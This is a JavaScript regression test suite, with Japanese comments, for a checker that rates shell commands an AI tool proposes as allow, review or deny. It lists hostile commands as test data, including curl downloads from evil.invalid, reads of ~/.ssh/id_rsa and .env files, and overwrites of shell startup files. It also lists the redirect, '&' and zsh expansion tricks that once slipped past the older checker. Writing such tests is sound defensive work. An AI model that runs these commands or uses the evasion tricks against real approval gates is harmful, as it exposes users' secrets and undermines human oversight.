'use strict';

// 承認判断票の「緑の誤発行」回帰テスト。
// review-bouncer で実測された攻撃パターンをそのまま固定する。
// 設計原則: 証明できない操作は緑（allow）にしない。取りこぼし（本当は安全なのに review）は許容。

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const root = path.resolve(__dirname, '..', '..', '..');
const serverPath = path.join(root, 'scripts', 'common', 'monitor-server.js');

// LOG_DIR は require 時に確定するので、coachRedact 用の一時ディレクトリを先に用意する。
const logDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bouncer-approval-'));
process.env.AI_SAFE_LOG_DIR = logDir;
process.on('exit', () => { fs.rmSync(logDir, { recursive: true, force: true }); });

// require.main ガードにより require では listen しない＝ポートを掴まず純関数だけ使える。
const srv = require(serverPath);

function guide(cmd, risk = 'low', extra = {}) {
  return srv.approvalGuide({
    hasCard: true,
    meta: `2026-07-28 10:00:00 ・ tool=bash ・ risk=${risk} ・ card=default-bash`,
    title: 'シェルコマンドを実行しようとしています',
    label: 'コマンド実行',
    cmd,
    dangers: [],
    ...extra,
  });
}

test('リダイレクト付きの git 閲覧コマンドは読み取り扱いにしない', () => {
  // git log/diff は読み取りに見えるが、> でシェル設定ファイルを丸ごと書き換えられる（永続化に使える）。
  for (const cmd of ['git log --all > ~/.zshrc', 'git diff > ~/.bashrc', 'git show HEAD >> ~/.zprofile']) {
    assert.notEqual(guide(cmd).status, 'allow', `${cmd} を今回だけ許可の目安にしてはいけない`);
    assert.notEqual(srv.explainCommand(cmd, 'bash').kind, 'read', `${cmd} を読み取りと説明してはいけない`);
  }
});

test('find の破壊オプションは削除・一括実行として扱う', () => {
  const del = guide('find . -delete');
  assert.equal(del.status, 'deny');
  assert.match(del.impact, /削除/);

  const docs = guide('find ~/Documents -name "*.docx" -delete');
  assert.equal(docs.status, 'deny');
  assert.match(docs.impact, /削除/);

  const exec = guide('find . -name "*.log" -exec rm {} +');
  assert.equal(exec.status, 'deny');

  for (const cmd of ['find . -execdir sh -c "id" \\;', 'find . -ok rm {} \\;', 'find . -fls /tmp/out', 'find . -fprintf /tmp/out %p']) {
    assert.notEqual(guide(cmd).status, 'allow', `${cmd} を今回だけ許可の目安にしてはいけない`);
  }
});

test('引用符・ワイルドカード越しの秘密パスを見落とさない', () => {
  for (const cmd of ['cat "$HOME/.env"', "cat '.env'", 'cat ~/.ssh/id_rsa', "cat '$HOME/.aws/credentials'"]) {
    const g = guide(cmd);
    assert.equal(g.status, 'deny', `${cmd} は秘密情報として拒否の目安にする`);
  }
});

test('find で秘密ファイルを集めて中身を出す形も緑にしない', () => {
  const g = guide('find ~ -name "*.env" -exec cat {} +');
  assert.equal(g.status, 'deny');
  assert.match(g.impact, /まとめて実行|秘密/);
});

test('改行はコマンド区切りとして扱い、複数行を読み取り扱いしない', () => {
  const g = guide('ls\nsudo chmod -R 777 /');
  assert.notEqual(g.status, 'allow', '先頭が ls でも後続行の権限操作を見逃さない');
  assert.equal(g.status, 'deny');
  assert.equal(srv.explainCommand('ls\nsudo chmod -R 777 /', 'bash').kind, 'unknown');
});

test('権限昇格そのものが判定に効く（文言だけで終わらせない）', () => {
  for (const cmd of ['sudo systemsetup -setremotelogin on', 'chmod 777 /etc/hosts', 'runas /user:Administrator cmd']) {
    assert.equal(guide(cmd).status, 'deny', `${cmd} は権限昇格として拒否の目安にする`);
  }
});

test('-r なしの rm も「戻せない削除」として表示する', () => {
  const g = guide('rm important.txt');
  assert.equal(g.status, 'review', '単一ファイル削除は少なくとも確認に倒す');
  assert.match(g.impact, /削除/, '削除であることを影響欄に明記する');
  assert.match(g.reversible, /戻せない|ゴミ箱/);
});

test('生成物クリーンアップを確認へ格下げしても、ガードの high 判定を隠さない', () => {
  const g = guide('rm -rf node_modules dist', 'high', {
    title: 'ディレクトリを再帰削除しようとしています',
    dangers: ['削除は元に戻せません'],
  });
  assert.equal(g.status, 'review');
  assert.match(g.why, /危険度/, '格下げの根拠としてガードの判定をカードに残す');
  assert.match(g.why, /高/);

  const lowRisk = guide('rm -rf node_modules', 'low');
  assert.equal(lowRisk.status, 'review');
  assert.doesNotMatch(lowRisk.why, /危険度/, 'ガードが high と言っていない時は付けない');
});

test('素直な安全形は過剰に拒否へ落とさない', () => {
  const safe = [
    'ls -la',
    'pwd',
    'git status',
    'git log --oneline | head -20',
    'cat README.md | head',
    'find . -name "*.js"',
    'wc -l src/app.js',
    'grep -r "TODO" ./src --include="*.js" | head -20',
  ];
  for (const cmd of safe) {
    assert.equal(guide(cmd).status, 'allow', `${cmd} は今回だけ許可の目安のままにする`);
  }
});

// ---- 区切り・リダイレクトの体系的判定 (cycle1 Y-1 / Y-2 / codex RED-1) ----------
// 旧実装は `(?:^|[^2])>` で「2> を丸ごと検査対象外」にしていたため、
// `git log --all 2> ~/.zshrc` が緑のまま実際に元ファイルを上書きしていた（レビュアー実測）。

test('stderr リダイレクトもファイルを壊すので読み取り扱いにしない', () => {
  const cases = [
    // レビュアーが bash で実走し、18バイトの元ファイルが69バイトで上書きされた形。
    'git log --all 2> ~/.zshrc',
    'git log 2> ~/.zshrc',
    'ls 2> ~/.bashrc',
    'ls 2>> ~/.bashrc',
    'git log 2>> ~/.zprofile',
    'git log 2> "$HOME/.zprofile"',
    // 空白の有無・記述子の違い・まとめて捨てる形の変形。
    'cat README.md 2>~/.bashrc',
    'cat README.md 2>    ~/.bashrc',
    'ls 1> ~/.zshrc',
    'ls 1>> ~/.zshrc',
    'ls 9> ~/.zshrc',
    'ls &> ~/.zshrc',
    'ls &>> ~/.zshrc',
    'ls >| ~/.zshrc',
    'ls 2>| ~/.zshrc',
    'cat 1<> ~/.zshrc',
    'find . -name "*.js" 2> ~/.zshrc',
    'grep -r TODO ./src 2> ~/.bashrc | head -20',
    'wc -l app.js 2> ~/.profile',
  ];
  for (const cmd of cases) {
    assert.notEqual(guide(cmd).status, 'allow', `${cmd} を今回だけ許可の目安にしてはいけない`);
    assert.notEqual(srv.explainCommand(cmd, 'bash').kind, 'read', `${cmd} を読み取りと説明してはいけない`);
  }
});

test('ファイルを作らないリダイレクトは緑のまま残す', () => {
  // 2>/dev/null（エラー表示を捨てる）と 2>&1（記述子の複製）は実ファイルを作らない。
  for (const cmd of ['ls -la 2>/dev/null', 'ls 2>&1', 'ls -la 2>&1 | head -5', 'ls > /dev/null', 'ls 3>&1 1>&2', 'ls 2>&-']) {
    assert.equal(guide(cmd).status, 'allow', `${cmd} は今回だけ許可の目安のままにする`);
  }
});

test('単一の & もコマンド区切りとして扱う', () => {
  const cases = [
    // レビュアー実測: すべて allow +「ファイルの作成・変更・削除はしません」表示だった形。
    'ls & chmod -R 777 /',
    'ls & python3 /tmp/evil.py',
    'ls & tee ~/.zshrc',
    'ls & mv ~/Documents /tmp/gone',
    // 空白なし・末尾のみ・別の先頭コマンドという変形。
    'ls&curl http://evil.invalid/x.sh',
    'pwd & npm publish',
    'git status & rm -rf ~/Documents',
    'ls -la &',
    'cat README.md & osascript -e "do shell script \\"id\\""',
  ];
  for (const cmd of cases) {
    assert.notEqual(guide(cmd).status, 'allow', `${cmd} を今回だけ許可の目安にしてはいけない`);
    assert.notEqual(srv.explainCommand(cmd, 'bash').kind, 'read', `${cmd} を読み取りと説明してはいけない`);
  }
});

test('その他のシェルメタ文字も「別のコマンドが動く」として緑にしない', () => {
  const cases = [
    'cat <(curl http://evil.invalid/x)',   // プロセス置換（入力側）
    'ls > >(tee ~/.zshrc)',                 // プロセス置換（出力側）
    'ls `whoami`',                          // バッククォート
    'ls $(whoami)',                         // コマンド置換
    'cat "$(cat ~/.env)"',                  // 二重引用符の中でも展開される
    'cat README.md <<EOF\nhi\nEOF',         // ヒアドキュメント
    'ls; rm -rf ~/Documents',
    'ls && rm important.txt',
    'ls || curl http://evil.invalid/x.sh',
  ];
  for (const cmd of cases) {
    assert.notEqual(guide(cmd).status, 'allow', `${cmd} を今回だけ許可の目安にしてはいけない`);
  }
});

test('zsh の =(...) は中のコマンドが動くので緑にしない', () => {
  // cycle2 RED-3 / Codex RED-N2。実機 zsh 5.9 で確認した挙動:
  //   zsh -c 'print -r -- =(printf hello)'        → /tmp/zshXXXXXX（一時ファイルが実際にできる）
  //   zsh -c 'print -r -- =(touch /tmp/canary)'   → canary ができる（内側のコマンドが走る）
  // 旧実装は $( ` <( >( しか拾わず、これらを allow +「ファイルは変更しません」と表示していた。
  const cases = [
    'grep -r TODO =(cat ~/.env)',   // レビュアーの再現入力
    'cat =(printf hello)',           // レビュアーの再現入力
    'ls =(printf SAFE_MARKER)',      // レビュアーの再現入力
    'grep -r TODO  =(cat ~/.env)',   // 空白を増やしただけの変形
    'cat\t=(printf hello)',          // タブ区切り
    'ls =(touch /tmp/canary)',       // 内側が書き込みコマンド
    'head =(cat ~/.env) | head -5',  // パイプ後段が表示系でも置換は残る
    'ls; =(printf hello)',           // 区切りの直後も語頭
  ];
  for (const cmd of cases) {
    assert.notEqual(guide(cmd).status, 'allow', `${cmd} を今回だけ許可の目安にしてはいけない`);
    assert.notEqual(srv.explainCommand(cmd, 'bash').kind, 'read', `${cmd} を読み取りと説明してはいけない`);
  }
  assert.deepEqual(srv.scanShellCommand('cat =(printf hello)').substitutions, ['=(']);
  // 二重引用符の中の =( は zsh でも展開されない（実機で内側が走らないことを確認済み）。
  assert.equal(srv.isReadOnlyPipeline('cat "=(printf hello)"'), true);
});

test('配列代入 arr=(...) は置換ではないので緑を失わせない', () => {
  // 実機 zsh 5.9 で arr=(touch /tmp/canary) は touch を実行しない（代入されるだけ）。
  // 語頭ではない = に続く ( を置換と誤検知すると、この形が review へ落ちてしまう。
  const assignments = [
    'arr=(1 2 3)',
    'export ARR=(a b)',
    'FOO=(x)',
    'files=(*.js)',
    'typeset -a nums=(1 2 3)',
    'arr=(echo hi)',
  ];
  for (const cmd of assignments) {
    assert.deepEqual(srv.scanShellCommand(cmd).substitutions, [], `${cmd} は置換ではない`);
    assert.equal(srv.isReadOnlyPipeline(cmd), true, `${cmd} で読み取り判定を失わせない`);
  }
  // 読み取りコマンドの引数に同じ形が来ても緑のまま。
  for (const cmd of ['ls arr=(1 2 3)', 'cat files=(a b)', 'ls FOO=(x) -la']) {
    assert.equal(guide(cmd).status, 'allow', `${cmd} は今回だけ許可の目安のままにする`);
  }
});

test('zsh の展開フラグ e とグロブ修飾子も「別のコマンドが動く」として扱う', () => {
  // 実機 zsh 5.9 で内側が実行されることを確認した形だけを対象にする。
  //   v='$(touch f)'; print -r -- ${(e)v}   → f ができる（"${(e)v}" と二重引用符でも同じ）
  //   print -r -- *(e:'touch f':) / *(e{...}) / *(e[...]) / *(+func) → f ができる
  for (const cmd of ['cat ${(e)payload}', 'cat "${(e)payload}"', "ls *(e:'touch /tmp/canary':)",
    'ls *(e{touch /tmp/canary})', 'ls *(e[touch /tmp/canary])', 'ls *(+f)']) {
    assert.notEqual(guide(cmd).status, 'allow', `${cmd} を今回だけ許可の目安にしてはいけない`);
  }
  // e を含まないフラグ・コードを走らせないグロブ修飾子は過剰検知しない
  // （${(f)v} は値を展開し直さない / *(.) *(/) はファイル種別の絞り込み）。
  for (const cmd of ['ls *(.)', 'ls *(/)', 'ls -la *(.)']) {
    assert.equal(srv.isReadOnlyPipeline(cmd), true, `${cmd} で読み取り判定を失わせない`);
  }
  assert.deepEqual(srv.scanShellCommand('cat ${(f)v}').substitutions, []);
  assert.deepEqual(srv.scanShellCommand('cat ${(e)v}').substitutions, ['${(e']);
});

test('語を割る引用符・バックスラッシュは「読み取りと言い切れない」扱いにする', () => {
  // Y-5: 文字列照合でシェルを判定する方式の構造的限界。
  // 危険語の照合そのものはすり抜けるが、緑（今回だけ許可）は出さない。
  for (const cmd of ['cat ~/.e""nv', "cat ~/.e''nv", 'find . -de""lete', 'echo x > ~/".zshrc"', 'echo x > ~/.z\\shrc', 'ca""t ~/.ssh/id_rsa']) {
    assert.notEqual(guide(cmd).status, 'allow', `${cmd} を今回だけ許可の目安にしてはいけない`);
  }
  // 語の先頭・option=value の引用符は通常操作なので、過剰検知しない。
  for (const cmd of ['grep -r "TODO" ./src --include="*.js" | head -20', 'find . -name "*.js"', 'ls "My Documents"', 'cat "$HOME/README.md"']) {
    assert.equal(guide(cmd).status, 'allow', `${cmd} は通常操作なので緑を維持する`);
  }
});

test('シェル走査は演算子と出力先を分けて取り出す', () => {
  // 「2> を丸ごと除外」のような場当たり除外を再発させないための土台の検査。
  const write = srv.scanShellCommand('git log --all 2> ~/.zshrc');
  assert.deepEqual(write.separators, []);
  assert.deepEqual(write.redirects, [{ op: '2>', target: '~/.zshrc', fdDup: false }]);

  const discard = srv.scanShellCommand('ls -la 2>/dev/null | head');
  assert.deepEqual(discard.redirects, [{ op: '2>', target: '/dev/null', fdDup: false }]);
  assert.equal(discard.pipeSegments.length, 2);

  const dup = srv.scanShellCommand('ls 2>&1');
  assert.equal(dup.redirects[0].fdDup, true, '記述子の複製はファイルを作らない');

  const background = srv.scanShellCommand('ls & tee ~/.zshrc');
  assert.deepEqual(background.separators, ['&'], '単一の & は区切り');
  const andand = srv.scanShellCommand('ls && pwd');
  assert.deepEqual(andand.separators, ['&&'], '&& と単一 & を取り違えない');

  assert.equal(srv.isReadOnlyPipeline('ls -la 2>/dev/null | head -20'), true);
  assert.equal(srv.isReadOnlyPipeline('ls 2> ~/.zshrc'), false);
  assert.equal(srv.isReadOnlyPipeline('ls & pwd'), false);
});

test('受講者の素直な読み取り操作は緑を維持する（過剰検知の歯止め）', () => {
  const safe = [
    'ls -la',
    'pwd',
    'git status',
    'git diff --stat',
    'git log --oneline | head',
    'git log -p | head -100',
    'cat README.md | head',
    'cat package.json | head -30',
    'grep -r "TODO" ./src | head -20',
    'grep -i "error" logs/app.log | wc -l',
    'wc -l x.js',
    'head -50 package.json',
    'stat README.md',
    'file /usr/bin/node',
    'find ./src -name "*.test.js" | sort | head',
    'ls My\\ Documents',
    'find . -name \\*.js',
    'grep "a\\|b" README.md',
  ];
  for (const cmd of safe) {
    assert.equal(guide(cmd).status, 'allow', `${cmd} は今回だけ許可の目安のままにする`);
  }
});

// ---- 他人へ書き込みを与える権限操作 (cycle1 Y-3 判断票側) ------------------------
// 旧実装は `\bchmod\s+777\b` だったため、フラグが挟まる `chmod -R 777 /` を取りこぼしていた。
// 全エンジン共通の基準:
//   数値 = 下3桁が 777 か 666 なら先頭桁は問わない (777 / 0777 / 1777 / 2777 / 666 / 0666)
//   記号 = 付与先に a か o を含み、+ か = で w を与える形 (a+rwx / a=rwx / o+w / go+w)
//   対象外 = 755 / +x / u+w / g+w / 付与先を省いた +w / 4755 などの setuid

test('chmod の数値モードはフラグの並び順・先頭桁にかかわらず権限昇格として拒否する', () => {
  const cases = [
    'chmod 777 /etc/hosts',
    'chmod -R 777 /',
    'chmod 777 -R /',
    'chmod -Rf 777 /',
    'chmod --recursive 777 /',
    'chmod -R -v 777 ~/Documents',
    'chmod -v -R 777 ~/Documents',
    'chmod 0777 ~/Documents',
    'chmod 666 ~/Documents/notes.txt',
    'chmod -R 666 ~/Documents',
    'chmod 0666 notes.txt',
    // 先頭にスティッキー/setgid/setuid が付いても、下3桁が 777・666 なら他人が書き込める。
    'chmod 1777 /tmp',
    'chmod 2777 shared/',
    'chmod 4777 /usr/bin/x',
    'chmod 7777 shared/',
    'chmod 1666 shared.txt',
    'chmod -R 1777 /tmp',
    'sudo chmod -R 777 /usr/local',
    'ls & chmod -R 777 /',
    'ls; chmod 777 -R /',
  ];
  for (const cmd of cases) {
    assert.equal(guide(cmd).status, 'deny', `${cmd} は権限昇格として拒否の目安にする`);
  }
});

test('chmod の記号モードは + と = のどちらでも拒否する', () => {
  for (const cmd of ['chmod a+rwx /usr/local/bin', 'chmod a+w shared.txt', 'chmod o+rwx ~/Documents',
    'chmod o+w ~/Documents', 'chmod -R a+w ~/Documents', 'chmod a+w -R ~/Documents', 'chmod go+w shared/',
    // = は + と結果が同じなので、+ だけ見ていると回避される。
    'chmod a=rwx /usr/local/bin', 'chmod a=w shared.txt', 'chmod o=rwx ~/Documents',
    'chmod o=w ~/Documents', 'chmod -R a=rwx ~/Documents', 'chmod go=w shared/']) {
    assert.equal(guide(cmd).status, 'deny', `${cmd} は権限昇格として拒否の目安にする`);
  }
  // 自分・同一グループだけへの付与、読み取りだけの付与、権限を狭める操作は対象外。
  for (const cmd of ['chmod u+w notes.txt', 'chmod g+w notes.txt', 'chmod u+rwx notes.txt',
    'chmod u=w notes.txt', 'chmod a+r public.txt', 'chmod a-w locked.txt', 'chmod +x script.sh']) {
    assert.equal(guide(cmd).status, 'review', `${cmd} を権限昇格として拒否まで引き上げない`);
  }
});

test('付与先を省いた +w は過剰検知になるので拒否まで上げない', () => {
  // umask 022 の環境では所有者にしか書き込みを与えず、「編集できるようにする」普通の操作。
  // 判断票の原則は「緑の誤発行は不許容／黄の取りこぼしは許容」なので review で止めれば足りる。
  for (const cmd of ['chmod +w shared.txt', 'chmod -R +w ~/Documents']) {
    assert.equal(guide(cmd).status, 'review', `${cmd} は確認どまりにする（緑にも赤にもしない）`);
  }
});

test('カンマ区切りの複合指定は、どの節に当たっても拒否する', () => {
  // モードはカンマで並べられる。先頭の節だけを見ると 2 つ目以降を見落とす
  // （`chmod a+x,o+w file` は実際に他人へ書き込みを与える）。
  for (const cmd of ['chmod a+x,o+w file', 'chmod u+r,a+w file', 'chmod o+w,u+x file',
    'chmod -R a+x,o+w dir/', 'chmod a+r,a+w shared.txt', 'chmod u+x,go+w shared/',
    'chmod g+r,o=w file', 'chmod u+r,g+x,a+w file']) {
    assert.equal(guide(cmd).status, 'deny', `${cmd} はどの節でも他人への書き込み付与として拒否する`);
  }
  // どの節も自分・同一グループ止まりなら、複合でも拒否まで引き上げない。
  for (const cmd of ['chmod u+w,g+x file', 'chmod u+r,g+r file', 'chmod u+rw,go+r file',
    'chmod u+rw,go+rx file', 'chmod a+r,u+w file', 'chmod a+rX,u+w file', 'chmod u+x,g+x file']) {
    assert.equal(guide(cmd).status, 'review', `${cmd} を権限昇格として拒否まで引き上げない`);
  }
});

test('権限操作の影響欄は「誰が何をできるようになるか」を具体的に書く', () => {
  const recursive = guide('chmod -R 777 /Applications');
  assert.match(recursive.impact, /権限が変わり/, '権限が変わることを影響欄に明記する');
  assert.match(recursive.impact, /誰でも読み書き・実行/, '777 は実行権も与えることを明記する');
  assert.match(recursive.impact, /中身すべて/, '-R は配下すべてに広がることを明記する');
  assert.match(recursive.reversible, /手作業で戻す/, '元の権限は自動では戻らないことを伝える');

  const single = guide('chmod 777 /etc/hosts');
  assert.match(single.impact, /誰でも読み書き/);
  assert.doesNotMatch(single.impact, /中身すべて/, '-R なしで「配下すべて」と誤って書かない');

  // 666 と a+w / a=w は実行権を与えないので、実行までできるとは書かない。
  const noExec = guide('chmod 666 notes.txt');
  assert.match(noExec.impact, /誰でも読み書きできる/);
  assert.doesNotMatch(noExec.impact, /実行/, '666 で「実行できる」と誤って書かない');
  assert.doesNotMatch(guide('chmod a+w shared.txt').impact, /実行/);
  assert.doesNotMatch(guide('chmod a=w shared.txt').impact, /実行/);
  // 先頭桁が付いても下3桁で実行権の有無を判断する。
  assert.match(guide('chmod 1777 /tmp').impact, /誰でも読み書き・実行/);
  assert.doesNotMatch(guide('chmod 1666 shared.txt').impact, /実行/);
  assert.match(guide('chmod a=rwx /usr/local/bin').impact, /誰でも読み書き・実行/);

  // 複合指定では「全員・その他へ実行権が渡る節」があるときだけ実行に触れる。
  assert.match(guide('chmod a+x,o+w file').impact, /誰でも読み書き・実行/, 'a+x は全員に実行権を与える');
  assert.doesNotMatch(guide('chmod u+x,go+w shared/').impact, /実行/, 'u+x は所有者だけなので「誰でも実行」と書かない');
  assert.doesNotMatch(guide('chmod u+r,g+x,a+w file').impact, /実行/, 'g+x は同一グループだけ');

  // sudo 単体は従来どおりの説明のまま（chmod 用の文言に引きずられない）。
  const sudo = guide('sudo systemsetup -setremotelogin on');
  assert.equal(sudo.status, 'deny');
  assert.match(sudo.impact, /PC全体の設定/);
});

test('対象外の chmod や、文字列としての 777 / 666 を過剰検知しない', () => {
  // 下3桁が 777・666 でなければ、先頭桁が付いていても対象外。
  // 4755 の setuid は「他人への書き込み付与」とは別の危険なので、この枠では上げない。
  for (const cmd of ['chmod 755 script.sh', 'chmod 0755 script.sh', 'chmod 1755 dir/', 'chmod 4755 /usr/bin/x']) {
    assert.equal(guide(cmd).status, 'review', `${cmd} を権限昇格として拒否まで引き上げない`);
  }
  // コマンドが chmod でなければ、文字列としての数値には反応しない。
  assert.equal(guide('grep -r "777" ./src | head').status, 'allow');
  assert.equal(guide('cat docs/permissions-666.md').status, 'allow');
  assert.equal(guide('wc -l 777.txt').status, 'allow');
  assert.equal(guide('wc -l 1777.txt').status, 'allow');
});

test('Windows のアクセス権付与も権限昇格として拒否する', () => {
  // 付与先の名前は環境で変わる（Everyone / 全員 / Users / SID）ので、名前ではなく
  // 「/grant で F・M・C・W を与える」形で拾えていることを固定する。
  const cases = [
    'icacls C:\\ /grant Everyone:(F)',
    'icacls C:\\ /grant Everyone:F',
    'icacls C:\\data /grant Users:(OI)(CI)F',
    'icacls C:\\ /grant 全員:(F)',
    'icacls C:\\ /grant *S-1-1-0:(F)',
    'icacls C:\\ /grant:r Everyone:(F)',
    'cacls C:\\ /G Everyone:F',
    'icacls D:\\share /grant Everyone:(M) /T',
    'icacls C:\\Users /grant Everyone:(W)',
  ];
  for (const cmd of cases) {
    assert.equal(guide(cmd).status, 'deny', `${cmd} は権限昇格として拒否の目安にする`);
    assert.match(guide(cmd).impact, /アクセス権が変わり/, '何が変わるかを影響欄に書く');
  }

  // 読み取りだけの付与・権限剥奪・照会は、拒否まで引き上げない。
  for (const cmd of ['icacls C:\\Users', 'icacls C:\\Users /reset', 'icacls C:\\ /deny Everyone:(F)',
    'icacls C:\\ /grant Everyone:(RX)', 'icacls C:\\ /grant Everyone:(R)']) {
    assert.notEqual(guide(cmd).status, 'deny', `${cmd} を権限昇格として拒否まで引き上げない`);
  }
});

test('OpenCode+DeepSeek 経路でも「送信先が増える」バナー判定が立つ', () => {
  const marker = path.join(logDir, 'coach-engine');
  fs.writeFileSync(marker, 'opencode-deepseek', 'utf8');
  assert.equal(srv.coachRedact(), true, 'OpenCode+DeepSeek でもコーチ相談で送信先が増える');

  fs.writeFileSync(marker, 'd-claude', 'utf8');
  assert.equal(srv.coachRedact(), true);

  fs.writeFileSync(marker, 'gemini', 'utf8');
  assert.equal(srv.coachRedact(), false, '通常経路では余計なバナーを出さない');

  fs.rmSync(marker, { force: true });
  assert.equal(srv.coachRedact(), false);
});
